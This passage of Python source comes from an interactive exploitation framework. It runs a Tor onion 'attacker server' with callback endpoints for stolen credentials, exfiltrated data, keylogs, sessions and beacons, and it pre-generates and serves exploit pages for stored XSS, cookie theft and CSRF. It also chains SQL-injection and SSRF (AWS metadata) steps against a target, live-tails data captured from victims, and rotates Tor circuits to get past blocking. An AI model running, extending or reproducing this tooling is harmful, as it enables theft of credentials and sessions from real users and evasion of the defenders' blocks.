    # own HMAC-derived token — leaking /c/<tok> no longer reveals
    # /x, /k, /s, or /b.
    callback_urls = server.get_callback_urls(prefer_onion=True)
    if infra_mode == "custom":
        # Operator picked a custom proxy base; keep the per-kind tokens
        # but rewrite the host portion.
        _toks = {k: server.get_callback_url(k).rsplit("/", 1)[-1]
                 for k in "cxksb"}
        callback_urls = {k: f"{attacker_url}/{k}/{_toks[k]}" for k in "cxksb"}

    _KIND_LABELS = {
        "c": "credentials",
        "x": "exfil",
        "k": "keylog",
        "s": "session",
        "b": "beacon",
    }
    print()
    info(f"Attacker base:    {attacker_url}")
    info("Callback endpoints (each has a distinct HMAC-derived token):")
    for _k in "cxksb":
        info(f"  /{_k} ({_KIND_LABELS[_k]:<12s}) {callback_urls[_k]}")

    # Heads-up if the attacker base is loopback-only. Anything that relies
    # on [ATTACKER]/... callbacks (stored XSS payloads, cookie-exfil,
    # CSRF confirmations, CRLF Location-override probes) will produce
    # ZERO evidence in this mode because victims on the real internet
    # cannot hit 127.0.0.1. Steps marked callback-dependent will be
    # flagged in the per-step prompt so the operator is never silently
    # running a useless payload.
    infra_is_loopback = _attacker_url_is_loopback(attacker_url)
    if infra_is_loopback:
        warn("Loopback-only mode: callbacks to [ATTACKER]/... only arrive "
             "if the victim's browser is on THIS host. Stored XSS / "
             "cookie-exfil / CSRF confirm / CRLF-Location probes will "
             "be auto-skipped unless you force-run them.")
    print()

    # ── Pre-generate all exploit files upfront ──
    if preset["auto_files"]:
        _pre_generate_all_files(exploitable, base_url, _sp, attacker_url,
                                file_mgr, server, audit,
                                callback_urls=callback_urls,
                                infra_is_loopback=infra_is_loopback)

    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    exploitable.sort(key=lambda v: sev_order.get(v.get("severity", ""), 5))

    # ── Summary table ──
    print(f"  {'#':>3}  {'Sev':8}  {'Type':20}  Title")
    print(f"  {'─' * 70}")
    for i, v in enumerate(exploitable):
        sev = v.get("severity", "?")
        etype = v.get("exploit_info", {}).get("type", "?")
        color = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y, "LOW": C}.get(sev, D)
        print(f"  {i+1:>3}  {color}[{sev:6}]{N}  {etype:20}  {v.get('title', '?')[:45]}")
    print()

    findings_summary: list = []
    chain_data: dict = {}

    # First pass: let the operator pick which findings to run up front.
    sel = prompt("Enter number (or 'all' for sequential, 'q' to skip directly "
                 "to control deck)", "all")
    if sel.lower() in ("q", "quit"):
        targets: list = []
    elif sel.isdigit():
        idx = int(sel) - 1
        if 0 <= idx < len(exploitable):
            targets = [exploitable[idx]]
        else:
            err(f"Invalid number: {sel}")
            targets = []
    else:
        targets = list(exploitable)

    if targets:
        _run_findings_loop(
            targets, exploitable, base_url, _sp, attacker_url,
            executor, file_mgr, server, audit, chain_data,
            preset, auto_mode, callback_urls, infra_is_loopback,
            findings_summary,
        )

    # Control deck: keep the session live until the operator explicitly
    # tears it down. Previously the walkthrough auto-ran
    # _walkthrough_session_end() which printed a report and fell
    # through to the finally: block that stopped the server + wiped
    # every generated file. Operators lost access to their live
    # capture stream and their pre-generated payload files the instant
    # the last finding finished. Now the control deck stays up until
    # 'q' is selected.
    _walkthrough_control_deck(
        exploitable, base_url, _sp, attacker_url,
        executor, file_mgr, server, audit, chain_data,
        preset, auto_mode, callback_urls, infra_is_loopback,
        findings_summary,
    )

    return client, executor


def _run_findings_loop(targets, exploitable, base_url, _sp,
                        attacker_url, executor, file_mgr, server,
                        audit, chain_data, preset, auto_mode,
                        callback_urls, infra_is_loopback,
                        findings_summary) -> bool:
    """Run a batch of findings through _run_steps_smart. Returns True
    if the operator requested a hard quit (from inside a step)."""
    for vi, v in enumerate(targets):
        if shutdown_requested():
            return True
        file_mgr.cleanup_expired()

        sev = v.get("severity", "?")
        color = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y, "LOW": C}.get(sev, D)
        try:
            conf = float(v.get("confidence", 0))
        except (TypeError, ValueError):
            conf = 0.0
        ei = v.get("exploit_info", {})
        etype = ei.get("type", "unknown")
        param = ei.get("parameter", "")
        test_url = v.get("test_url") or base_url

        if not any(f.get("title") == v.get("title", "?")[:60] and
                   f.get("type") == etype for f in findings_summary):
            findings_summary.append({
                "severity": sev, "type": etype,
                "title": v.get("title", "?")[:60],
            })
        audit.log("finding_start", f"{etype}: {v.get('title', '?')[:50]}",
                  vuln_type=etype, risk=sev)

        print(f"\n  {'═' * 65}")
        print(f"  {color}[{sev}]{N} {B}{v.get('title', '?')}{N}")
        print(f"  {'═' * 65}")
        print(f"  {B}Type:{N}       {etype}")
        print(f"  {B}Confidence:{N} {conf*100:.0f}%")
        print(f"  {B}Detail:{N}     {v.get('detail', 'N/A')[:200]}")
        if ei.get("risk"):
            print(f"  {B}Risk:{N}       {ei['risk']}")
        if v.get("evidence"):
            print(f"  {B}Evidence:{N}   {v['evidence'][:150]}")
        if test_url and test_url != "[TARGET]":
            print(f"  {B}Test URL:{N}   {test_url}")
        print()

        steps = _build_exploit_steps(etype, param, ei, test_url, base_url, _sp)
        print(f"  {B}Exploitation Steps ({len(steps)}):{N}")
        print()

        quit_requested = _run_steps_smart(
            steps, etype, test_url, vi, executor, file_mgr,
            server, audit, chain_data, attacker_url, preset, auto_mode,
            callback_urls=callback_urls,
            infra_is_loopback=infra_is_loopback)

        if quit_requested:
            return True

        if len(targets) > 1 and vi < len(targets) - 1:
            print()
            stats = audit.get_stats()
            print(f"  {D}[Session: {stats['executions']} exec, "
                  f"{stats['files_generated']} files, "
                  f"{stats['skips']} skip]{N}")
            if not confirm("Continue to next finding?"):
                return False
    return False


def _walkthrough_control_deck(exploitable, base_url, _sp,
                               attacker_url, executor, file_mgr,
                               server, audit, chain_data, preset,
                               auto_mode, callback_urls,
                               infra_is_loopback, findings_summary):
    """Post-run control center. Keeps the attacker server + hidden
    service + generated files alive and lets the operator:
      R   re-run a finding (pick index)
      P   pick another finding
      L   live-tail captures from the attacker server
      C   run an ad-hoc authenticated request against the target
      A   show audit log + stats
      F   list generated exploit files (with serve URLs)
      U   show all callback URLs again (with labels)
      T   toggle auto-mode for subsequent findings
      S   stop the attacker server (with confirmation)
      G   generate + view a session report
      Q   quit + wipe everything
    """
    _KIND_LABELS = {
        "c": "credentials",
        "x": "exfil",
        "k": "keylog",
        "s": "session",
        "b": "beacon",
    }
    _already_reported = False

    while True:
        if shutdown_requested():
            break
        print()
        heading("Control Deck")
        stats = audit.get_stats()
        cap_count = server.capture_count() if server.is_running else 0
        _onion = server.onion_host if server and server.is_running else None
        server_state = (
            f"{G}RUNNING{N}" if server and server.is_running
            else f"{R}STOPPED{N}"
        )
        print(f"  {B}Server:{N}      {server_state}  "
              f"{'('+ _onion +')' if _onion else '(loopback-only)' if infra_is_loopback else ''}")
        print(f"  {B}Captures:{N}    {cap_count}")
        print(f"  {B}Executions:{N}  {stats['executions']} "
              f"({stats['successes']} ok, {stats['failures']} fail)")
        print(f"  {B}Files:{N}       "
              f"{len([f for f in file_mgr.list_files() if f['exists']])} active")
        print(f"  {B}Auto-mode:{N}   {'ON' if auto_mode else 'off'}")
        print()
        print(f"  {G}R{N}  Re-run a finding       "
              f"{G}P{N}  Pick another finding")
        print(f"  {G}L{N}  Live capture viewer    "
              f"{G}C{N}  Run custom request")
        print(f"  {G}A{N}  Audit log + stats      "
              f"{G}F{N}  List generated files")
        print(f"  {G}U{N}  Show callback URLs     "
              f"{G}T{N}  Toggle auto-mode")
        print(f"  {G}N{N}  New Tor circuit        "
              f"{G}H{N}  Target health check")
        print(f"  {G}X{N}  Clear captures buffer  "
              f"{G}V{N}  Save captures to file")
        print(f"  {G}G{N}  Generate report        "
              f"{G}S{N}  Stop attacker server")
        print(f"  {G}Q{N}  Quit + wipe everything")
        print()
        cmd = prompt("Control deck", "Q").strip().upper()
        if not cmd:
            cmd = "Q"

        if cmd == "Q":
            if server and server.is_running and cap_count > 0:
                warn(f"{cap_count} captured callback(s) are still in the "
                     "in-memory buffer.")
                # Offer to preserve them in the session report BEFORE
                # wiping. Previous code just confirmed 'really quit?' and
                # on 'yes' silently dropped them — which meant the one
                # piece of evidence the operator actually wanted
                # (what the victim sent back) vanished with the
                # teardown. The report embeds the captures via
                # ReportGenerator, so generating + displaying first is
                # lossless from the operator's perspective.
                if confirm("Dump captures + session report before wiping?"):
                    _generate_and_show_report(
                        audit, file_mgr, findings_summary, server)
                    _already_reported = True
                if not confirm("Really quit and wipe everything?"):
                    continue
            elif not _already_reported and len(findings_summary) > 0:
                if confirm("Generate session report before wiping?"):
                    _generate_and_show_report(
                        audit, file_mgr, findings_summary, server)
                    _already_reported = True
            break

        elif cmd in ("R", "P"):
            if not exploitable:
                warn("No findings available to re-run.")
                continue
            print()
            print(f"  {'#':>3}  {'Sev':8}  {'Type':20}  Title")
            print(f"  {'─' * 70}")
            for i, v in enumerate(exploitable):
                sev = v.get("severity", "?")
                etype = v.get("exploit_info", {}).get("type", "?")
                color = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y,
                         "LOW": C}.get(sev, D)
                print(f"  {i+1:>3}  {color}[{sev:6}]{N}  {etype:20}  "
                      f"{v.get('title', '?')[:45]}")
            print()
            sel = prompt("Finding # (or blank to cancel)", "").strip()
            if not sel:
                continue
            if sel.lower() == "all":
                targets = list(exploitable)
            elif sel.isdigit() and 1 <= int(sel) <= len(exploitable):
                targets = [exploitable[int(sel) - 1]]
            else:
                err(f"Invalid selection: {sel}")
                continue
            _run_findings_loop(
                targets, exploitable, base_url, _sp, attacker_url,
                executor, file_mgr, server, audit, chain_data,
                preset, auto_mode, callback_urls, infra_is_loopback,
                findings_summary,
            )

        elif cmd == "L":
            _live_capture_viewer(server)

        elif cmd == "C":
            _control_deck_custom_request(executor, attacker_url,
                                          callback_urls, chain_data)

        elif cmd == "A":
            print()
            stats = audit.get_stats()
            print(f"  {B}Session:{N}      {stats['session_id']}")
            print(f"  {B}Duration:{N}     {stats['duration_seconds']}s")
            print(f"  {B}Executions:{N}   {stats['executions']} "
                  f"({stats['successes']} ok, {stats['failures']} fail)")
            print(f"  {B}Skipped:{N}      {stats['skips']}")
            print(f"  {B}Files gen:{N}    {stats['files_generated']}")
            print(f"  {B}Alerts:{N}       {stats['alerts']}")
            if stats.get("vuln_types_tested"):
                print(f"  {B}Vuln types:{N}   "
                      f"{', '.join(stats['vuln_types_tested'])}")
            print()
            feed = audit.get_live_feed(last_n=40)
            if not feed:
                info("Audit log is empty.")
            else:
                print(f"  {B}Last {len(feed)} entries:{N}")
                for e in feed:
                    risk = e.get("risk", "")
                    risk_tag = f" [{risk}]" if risk else ""
                    status = ""
                    if e.get("success") is True:
                        status = f" {G}OK{N}"
                    elif e.get("success") is False:
                        status = f" {R}FAIL{N}"
                    print(f"    [{e['ts_iso']}] {e['action']:14s}{risk_tag} "
                          f"{e.get('detail', '')[:60]}{status}")
            print()

        elif cmd == "F":
            tracked = file_mgr.list_files()
            active = [f for f in tracked if f["exists"]]
            print()
            if not active:
                info("No active exploit files.")
                continue
            print(f"  {B}Active Exploit Files ({len(active)}):{N}")
            for f in active:
                serve_info = ""
                if server and server.is_running:
                    try:
                        serve_info = f"  {D}→ {server.get_url(f['filename'])}{N}"
                    except RuntimeError:
                        serve_info = f"  {D}(server not running){N}"
                print(f"    {G}●{N} {f['filename']:30s} {f['type']:12s} "
                      f"{f['size_bytes']:>5d}B{serve_info}")

        elif cmd == "U":
            if not server.is_running:
                warn("Server is stopped — callback URLs are no longer live.")
                continue
            print()
            info(f"Attacker base: {attacker_url}")
            info("Callback endpoints (each has its own HMAC-derived token):")
            for _k in "cxksb":
                _url = callback_urls.get(_k) or server.get_callback_url(_k)
                info(f"  /{_k} ({_KIND_LABELS[_k]:<12s}) {_url}")

        elif cmd == "T":
            auto_mode = not auto_mode
            info(f"Auto-mode is now {'ON' if auto_mode else 'off'}")

        elif cmd == "G":
            _generate_and_show_report(audit, file_mgr, findings_summary, server)
            _already_reported = True

        elif cmd == "S":
            if not server.is_running:
                warn("Server is already stopped.")
                continue
            _cap = server.capture_count()
            if _cap > 0:
                warn(f"Stopping the server discards {_cap} captured "
                     "callback(s).")
                # Offer to dump-to-file before teardown so the operator
                # doesn't lose the evidence buffer.
                if confirm("Save captures to an ephemeral file first?"):
                    _save_captures_to_file(server, file_mgr)
            if not confirm("Stop the attacker server now?"):
                continue
            server.stop()
            ok("Attacker server stopped.")

        elif cmd == "N":
            # Force a fresh Tor circuit on demand. Useful when the
            # operator suspects the current exit node is rate-limited
            # or burned, or before moving to a new phase of the
            # walkthrough.
            _new_circuit_now(executor, audit)

        elif cmd == "H":
            # Target health probe: is it still alive, did our
            # captures stop arriving because the target is down
            # or because we're being blocked?
            _target_health_check(executor, attacker_url, server, audit)

        elif cmd == "X":
            if not server.is_running:
                warn("Server is already stopped — buffer empty.")
                continue
            _cap = server.capture_count()
            if _cap == 0:
                info("Capture buffer is already empty.")
                continue
            warn(f"About to clear {_cap} captured callback(s) from the "
                 "in-memory buffer — this is IRREVERSIBLE.")
            if confirm("Save captures to an ephemeral file first?"):
                _save_captures_to_file(server, file_mgr)
            if not confirm("Clear the buffer now?"):
                continue
            cleared = server.clear_captures()
            audit.log("captures_cleared", f"count={cleared}",
                      risk=AuditTrail.RISK_LOW)
            ok(f"Cleared {cleared} capture(s).")

        elif cmd == "V":
            if not server.is_running:
                warn("Server is stopped — no captures to save.")
                continue
            if server.capture_count() == 0:
                info("No captures in buffer yet.")
                continue
            _save_captures_to_file(server, file_mgr)

        else:
            warn(f"Unknown command: {cmd}")


def _live_capture_viewer(server):
    """Live-tail new callbacks as they arrive. Exits on empty-line /
    Enter / Ctrl-C. Never blocks the control deck for more than the
    poll interval when no captures arrive."""
    if not server or not server.is_running:
        warn("Server is not running — nothing to tail.")
        return
    _kc = {"credentials": R, "keylog": Y, "exfil": M, "session": R, "beacon": C}
    start = _time_mod.time()
    seen_count = server.capture_count()
    print()
    info("Live capture viewer. Press Ctrl-C to exit.")
    info(f"{seen_count} capture(s) already in buffer — showing new arrivals only.")
    try:
        while True:
            if shutdown_requested():
                break
            cur = server.capture_count()
            if cur > seen_count:
                new_items = server.get_captures(last_n=cur - seen_count)
                # get_captures returns reversed-newest-first; reverse
                # again so we print oldest of the batch first.
                for cap in reversed(new_items):
                    ep_color = _kc.get(cap.get("kind", ""), D)
                    remote = cap.get("remote", "")[:39]
                    body = (cap.get("data") or cap.get("query")
                            or "")[:120].replace("\n", "\\n")
                    print(f"  [{cap['time']}] {ep_color}{cap['method']:4s} "
                          f"{cap['endpoint']:2s}{N} from {remote} | {body}")
                seen_count = cur
            _time_mod.sleep(0.6)
    except KeyboardInterrupt:
        pass
    print()
    info(f"Tailed for {_time_mod.time()-start:.1f}s, "
         f"buffer now {server.capture_count()}.")


def _control_deck_custom_request(executor, attacker_url,
                                   callback_urls, chain_data):
    """Let the operator run an ad-hoc request against the target
    through the StepExecutor (so it honors Tor + jitter + audit).
    Placeholders [ATTACKER] / [ATTACKER]/c etc. are substituted."""
    if executor is None:
        warn("No step executor available — the walkthrough did not start "
             "a target client.")
        return
    print()
    method = prompt("Method (GET/POST/HEAD)", "GET").strip().upper()
    if method not in ("GET", "POST", "HEAD", "PUT", "DELETE", "PATCH"):
        err(f"Unsupported method: {method}")
        return
    url = prompt("URL (placeholders [ATTACKER], [ATTACKER]/c, …)", "").strip()
    if not url:
        return
    url = _subst_attacker(url, attacker_url, callback_urls=callback_urls)
    data = ""
    if method in ("POST", "PUT", "PATCH"):
        data = prompt("Body (blank for none)", "")
        data = _subst_attacker(data, attacker_url, callback_urls=callback_urls)
    req = {"method": method, "url": url}
    if data:
        req["data"] = data
    step = {"title": "Control-deck custom request", "request": req}
    try:
        executor.execute_step(step, vuln_type="custom")
    except Exception as _e:
        err(f"Request failed: {type(_e).__name__}: {_e}")


def _generate_and_show_report(audit, file_mgr, findings_summary, server):
    """Extracted from _walkthrough_session_end so the control deck
    can regenerate on demand."""
    fmt = prompt("Format (text/json)", "text").strip().lower()
    if fmt not in ("text", "json"):
        fmt = "text"
    report_content = ReportGenerator.generate(
        audit, file_mgr, fmt=fmt,
        findings_summary=findings_summary,
        server=server,
    )
    report_path = ReportGenerator.save_report(
        report_content, file_mgr, fmt=fmt,
    )
    ok(f"Report saved: {report_path.name} (ephemeral, auto-wipes)")
    print()
    if confirm("Display report now?"):
        print()
        print(report_content)
        print()


def _new_circuit_now(executor, audit):
    """Force a fresh Tor circuit via the TorClient (if available) or
    stem's newnym; falls back to a direct control-port signal. Used
    by the control deck 'N' command and whenever the operator wants
    to sever the current exit from previous observation."""
    # Prefer an already-imported gs_common.newnym — it knows how to
    # talk to the control port with whatever auth we've configured.
    try:
        from core import gs_common as _gsc
        _gsc.newnym()
        ok("Tor circuit rotated (newnym signal accepted)")
        audit.log("circuit_rotate",
                  "operator_requested",
                  risk=AuditTrail.RISK_LOW)
        return
    except Exception:
        pass
    try:
        import stem.control as _sc  # type: ignore
        import os as _os
        _port = int(_os.environ.get("TOR_CONTROL_PORT", "9051"))
        _pw = _os.environ.get("TOR_CONTROL_PASSWORD", "")
        with _sc.Controller.from_port(port=_port) as ctrl:
            if _pw:
                ctrl.authenticate(password=_pw)
            else:
                ctrl.authenticate()
            ctrl.signal(_sc.Signal.NEWNYM)
        ok("Tor circuit rotated (direct stem signal)")
        audit.log("circuit_rotate",
                  "operator_requested",
                  risk=AuditTrail.RISK_LOW)
    except Exception as _e:
        err(f"Could not rotate circuit: {type(_e).__name__}: {_e}")
        err("Is Tor's ControlPort open and cookie/password auth configured?")
        audit.log("circuit_rotate_failed",
                  f"{type(_e).__name__}",
                  risk=AuditTrail.RISK_MEDIUM)


def _target_health_check(executor, attacker_url, server, audit):
    """Quick 'is the target still alive?' probe. Previously when
    captures stopped arriving operators had no way to tell whether
    their target had gone down, the Tor exit had gotten burned, or
    their payload was silently being dropped — they'd just wait,
    assume the worst, and quit. The health check fires ONE HEAD
    request against a caller-supplied target URL, reports the
    status + elapsed, and logs the result to the audit."""
    if executor is None:
        warn("No step executor — can't probe without a Tor client.")
        return
    last_url = prompt(
        "Target URL to probe (blank to cancel)", "").strip()
    if not last_url:
        return
    if not last_url.startswith(("http://", "https://")):
        last_url = "https://" + last_url
    step = {
        "title": "Target health check (HEAD)",
        "request": {"method": "HEAD", "url": last_url},
    }
    t0 = _time_mod.time()
    try:
        result = executor.execute_step(step, vuln_type="health",
                                        skip_low_risk_confirm=True)
    except Exception as _e:
        err(f"Probe failed: {type(_e).__name__}: {_e}")
        audit.log("health_probe_failed",
                  f"{last_url[:60]}: {type(_e).__name__}",
                  risk=AuditTrail.RISK_LOW)
        return
    elapsed = _time_mod.time() - t0
    if result is None:
        warn(f"Probe returned no response after {elapsed:.1f}s.")
        warn("  - Target may be down, or")
        warn("  - Current Tor exit may be blocked by the target, or")
        warn("  - Firewall / rate-limiter in between.")
        warn("Try 'N' (new circuit) and probe again.")
        audit.log("health_probe_empty", last_url[:60])
        return
    status = getattr(result, "status_code", 0) or 0
    _kc = G if 200 <= status < 400 else Y if status else R
    print(f"  {_kc}HTTP {status}{N}  ({elapsed:.2f}s elapsed)")
    if 200 <= status < 400:
        ok("Target responding normally. If captures stopped arriving, "
           "the payload is the likely culprit (not target availability).")
    elif status in (403, 429, 503):
        warn("Target is blocking this Tor exit. Rotate with 'N' and retry.")
    elif status in (502, 504):
        warn("Upstream gateway / bad-gateway — target service is flapping.")
    audit.log("health_probe",
              f"{last_url[:60]} -> {status} in {elapsed:.1f}s",
              risk=AuditTrail.RISK_LOW,
              success=(200 <= status < 400))


def _save_captures_to_file(server, file_mgr):
    """Dump the current capture buffer to an ephemeral JSON file in
    /dev/shm/intel. Operator can inspect without the buffer being
    wiped by a future teardown."""
    if not server or not server.is_running:
        warn("Server is not running — nothing to save.")
        return
    caps = server.get_captures(last_n=9999)
    if not caps:
        info("Capture buffer is empty.")
        return
    blob = json.dumps(
        {
            "captured": len(caps),
            "attacker_base": server.get_attacker_url(prefer_onion=True),
            "onion_host": server.onion_host,
            "captures": caps,
        },
        indent=2,
    )
    out_path = file_mgr.generate(
        exploit_type="captures",
        content=blob,
        extension=".json",
    )
    ok(f"Saved {len(caps)} captures to {out_path.name} "
       f"(ephemeral, 0o600, auto-wipes)")


def _pre_generate_all_files(exploitable, base_url, sp, attacker_url,
                            file_mgr, server, audit,
                            callback_urls: Optional[dict] = None,
                            infra_is_loopback: bool = False):
    """Pre-generate all exploit HTML files at session start.

    This creates every file upfront so they're ready to use/serve
    when the user reaches that step. Files are tracked and served
    via ExploitServer automatically. When the attacker base is
    loopback-only we still generate the files (operator might use
    them in a local lab browser), but we stamp them with a big
    visible notice so nobody mistakes the absence of captures for
    target immunity.
    """
    heading("Pre-generating Exploit Files")
    count = 0
    skipped_callback = 0
    for v in exploitable:
        ei = v.get("exploit_info", {})
        etype = ei.get("type", "unknown")
        param = ei.get("parameter", "")
        test_url = v.get("test_url") or base_url
        target = test_url if test_url and test_url != "[TARGET]" else base_url

        steps = _build_exploit_steps(etype, param, ei, test_url, base_url, sp)
        for step in steps:
            if not step.get("generate_file"):
                continue
            if infra_is_loopback and _step_needs_callback(step):
                skipped_callback += 1
                continue
            finfo = step["generate_file"]
            content = finfo["content"]
            content = content.replace("[TARGET_URL]", target)
            content = _subst_attacker(content, attacker_url,
                                     callback_urls=callback_urls)

            fname = finfo.get("filename", f"{etype}_{secrets.token_hex(3)}.html")
            out_path = file_mgr.generate(
                exploit_type=etype, content=content, custom_name=fname,
            )
            serve_url = server.get_url(out_path.name)
            print(f"  {G}●{N} {out_path.name:35s} → {D}{serve_url}{N}")
            audit.log_file_generated(out_path.name, etype)
            count += 1

    if count > 0:
        ok(f"Pre-generated {count} exploit file(s) — all served on :{server.port}")
    else:
        info("No file-generation steps found in current findings.")
    if skipped_callback > 0:
        warn(f"Skipped pre-generation of {skipped_callback} callback-"
             "dependent file(s) because the attacker base is loopback-"
             "only. Re-run with 'onion' or 'custom' mode to enable.")
    print()


def _run_steps_smart(steps: list, etype: str, test_url: str,
                     vi: int, executor: StepExecutor,
                     file_mgr: ExploitFileManager,
                     server: ExploitServer, audit: AuditTrail,
                     chain_data: dict, attacker_url: str,
                     preset: dict, auto_mode: bool,
                     callback_urls: Optional[dict] = None,
                     infra_is_loopback: bool = False) -> bool:
    """Smart step execution — user controls each step but output chains.
    Returns True if user requested quit (q).

    Each step shows the command + context, then the user picks:
    r=run, e=edit+run, s=skip, n=next finding, d=files, a=audit, q=quit

    In auto_mode the default action is 'r' (auto-run) but user can
    still override with s/n/q at any point. Steps blocked by the preset's
    skip_risk are auto-skipped with a notice.

    Output from every executed command is captured and fed to chain_data,
    which substitutes into subsequent step commands.
    """
    step_idx = 0
    action = ""
    while step_idx < len(steps):
        if shutdown_requested():
            break
        step = steps[step_idx]
        step_num = step_idx + 1

        step_title = step.get("title", f"Step {step_num}")

        # Auto-skip steps above preset risk threshold
        step_risk = step.get("risk", "")
        if not step_risk and step.get("warning"):
            step_risk = "HIGH"
        if step_risk in preset.get("skip_risk", ()):
            print(f"  {D}[SKIP {step_num}/{len(steps)}] {step_title} "
                  f"(blocked by {preset['label']} preset){N}")
            audit.log_skip(f"preset_block:{step_title}", etype)
            step_idx += 1
            continue

        # Skip callback-dependent steps when the attacker base is
        # loopback-only. In non-auto mode we prompt so the operator
        # can still force-run for lab validation; in auto mode we skip
        # silently (but still log) to avoid chewing through victim
        # rate-limits on probes that can never return evidence.
        if infra_is_loopback and _step_needs_callback(step):
            if auto_mode:
                print(f"  {D}[SKIP {step_num}/{len(steps)}] {step_title} "
                      f"(needs reachable attacker URL; loopback-only){N}")
                audit.log_skip(f"loopback_callback:{step_title}", etype)
                step_idx += 1
                continue
            print(f"  {Y}[CALLBACK-DEPENDENT {step_num}/{len(steps)}]{N} "
                  f"{B}{step_title}{N}")
            warn("This step relies on the victim hitting [ATTACKER]/... "
                 "but your attacker base is loopback-only. Unless the "
                 "victim browser runs on THIS host, you will see zero "
                 "captures.")
            _force = prompt("Run anyway? y/N", "n").strip().lower()
            if _force not in ("y", "yes"):
                audit.log_skip(f"loopback_callback:{step_title}", etype)
                step_idx += 1
                continue

        # ── File-generation steps: already pre-generated ──
        if step.get("generate_file"):
            finfo = step["generate_file"]
            fname = finfo.get("filename") or f"{etype}_{secrets.token_hex(3)}.html"
            existing = file_mgr.get_path(fname)
            if existing:
                serve_url = server.get_url(existing.name)
                print(f"  {G}[FILE {step_num}/{len(steps)}]{N} {B}{step_title}{N}")
                ok(f"Already generated: {existing.name}")
                ok(f"Serving at: {serve_url}")
                if finfo.get("note"):
                    info(finfo["note"])
                chain_data[f"{etype}_file"] = existing.name
                chain_data[f"{etype}_url"] = serve_url
                chain_data["last_file"] = existing.name
                chain_data["last_serve_url"] = serve_url
            else:
                print(f"  {G}[FILE {step_num}/{len(steps)}]{N} {B}{step_title}{N}")
                content = finfo.get("content", "")
                content = content.replace("[TARGET_URL]", test_url)
                content = _subst_attacker(content, attacker_url,
                                         callback_urls=callback_urls)

                out_path = file_mgr.generate(
                    exploit_type=etype, content=content, custom_name=fname,
                )
                serve_url = server.get_url(out_path.name)
                ok(f"Generated: {out_path.name}")
                ok(f"Serving at: {serve_url}")
                if finfo.get("note"):
                    info(finfo["note"])
                audit.log_file_generated(out_path.name, etype)
                chain_data[f"{etype}_file"] = out_path.name
                chain_data[f"{etype}_url"] = serve_url
                chain_data["last_file"] = out_path.name
                chain_data["last_serve_url"] = serve_url
            print()
            step_idx += 1
            continue

        # ── Request-based steps ──
        req = step.get("request")
        if not req:
            info(f"Info: {step.get('note', step_title)}")
            audit.log("info_step", step_title, vuln_type=etype)
            step_idx += 1
            continue

        # Apply chain_data + attacker substitutions to the URL
        url = req.get("url", "")
        url = _subst_attacker(url, attacker_url, callback_urls=callback_urls)
        url = url.replace("[TARGET_URL]", test_url)
        for key, val in chain_data.items():
            placeholder = f"[{key.upper()}]"
            if placeholder in url:
                url = url.replace(placeholder, str(val)[:200])
        req["url"] = url

        # Apply substitutions to params too
        if req.get("params"):
            for pk, pv in req["params"].items():
                pv = _subst_attacker(str(pv), attacker_url,
                                     callback_urls=callback_urls)
                for key, val in chain_data.items():
                    placeholder = f"[{key.upper()}]"
                    if placeholder in pv:
                        pv = pv.replace(placeholder, str(val)[:200])
                req["params"][pk] = pv

        if req.get("data"):
            req["data"] = _subst_attacker(str(req["data"]), attacker_url,
                                         callback_urls=callback_urls)

        print(f"  {G}Step {step_num}/{len(steps)}{N}: {B}{step_title}{N}")
        if step.get("warning"):
            print(f"  {R}WARNING: {step['warning']}{N}")
        method = req.get("method", "GET")
        print(f"  {D}{method} {url[:80]}{N}")
        if req.get("params"):
            print(f"  {D}Params: {req['params']}{N}")
        if step.get("note"):
            print(f"  {D}Note: {step['note']}{N}")
        print()

        while True:
            default_action = "r"
            cap_count = server.capture_count() if server.is_running else 0
            cap_tag = f" ({cap_count} captured)" if cap_count else ""
            print(f"    {G}r{N}=run  {G}s{N}=skip  {G}n{N}=next finding  "
                  f"{G}d{N}=files  {G}c{N}=captures{cap_tag}  "
                  f"{G}a{N}=audit  {G}q{N}=quit")
            action = prompt(f"  Step {step_num}", default_action).lower()

            if action in ("q", "quit"):
                audit.log("session_end", "user_quit")
                return True

            if action in ("n", "next"):
                audit.log_skip(f"finding_{vi+1}_remaining_steps", etype)
                step_idx = len(steps)
                break

            if action in ("s", "skip"):
                info(f"Skipped step {step_num}")
                audit.log_skip(step_title, etype)
                step_idx += 1
                break

            if action in ("d", "download"):
                _show_tracked_files(file_mgr)
                if server.is_running:
                    base = server.get_attacker_url(prefer_onion=True)
                    info(f"Attacker base: {base}")
                    if server.onion_host:
                        info(f"(local mirror: http://127.0.0.1:{server.port}/)")
                continue

            if action in ("c", "captures"):
                _show_captures(server)
                continue

            if action in ("a", "audit"):
                _show_live_audit(audit)
                continue

            if action in ("r", "run"):
                # Operator already said 'r' at the step prompt; don't ask
                # a second time for low/medium-risk steps. HIGH/CRITICAL
                # still confirm inside execute_step regardless.
                result = executor.execute_step(
                    step, vuln_type=etype, skip_low_risk_confirm=True,
                )
                if result:
                    chain_data["last_output"] = result.response_body[:5000]
                    chain_data[f"{etype}_output_{step_idx}"] = result.response_body[:2000]
                    chain_data["last_status"] = str(result.status_code)
                    _auto_extract_chain_data(result.response_body, etype, chain_data)
                    if result.success:
                        ok(f"Step {step_num}: {result.evidence}")
                    elif result.error:
                        err(f"Step {step_num}: {result.error}")
                    else:
                        info(f"Step {step_num}: {result.evidence or 'Check output'}")
                print()
                step_idx += 1
                break

    return False


def _auto_extract_chain_data(output: str, etype: str, chain_data: dict):
    """Parse command output and extract data for chaining to next steps."""
    import re as _re

    # Extract IAM role names from AWS metadata
    if etype == "ssrf" and "arn:aws" not in output:
        lines = [l.strip() for l in output.split("\n") if l.strip() and not l.startswith("===")]
        if lines and len(lines) == 1 and " " not in lines[0]:
            chain_data["ROLE_NAME"] = lines[0]

    # Extract DB version
    if etype == "sqli":
        for pattern in [r"(\d+\.\d+\.\d+[-\w]*)", r"(MariaDB|PostgreSQL|SQLite)\s+[\d.]+"]:
            m = _re.search(pattern, output)
            if m:
                chain_data["db_version"] = m.group(0)
                break

    # Extract column count from ORDER BY
    if "ORDER BY" in chain_data.get("last_output", ""):
        numbers = _re.findall(r"ORDER BY (\d+)", output)
        if numbers:
            chain_data["column_count"] = max(int(n) for n in numbers)

    # Extract table names
    tables = _re.findall(r"(?:Table|table):\s*(\w+)", output)
    if tables:
        chain_data["tables"] = tables

    # Generic: capture anything that looks like a key=value
    for line in output.split("\n"):
        if ":" in line and len(line) < 200:
            parts = line.split(":", 1)
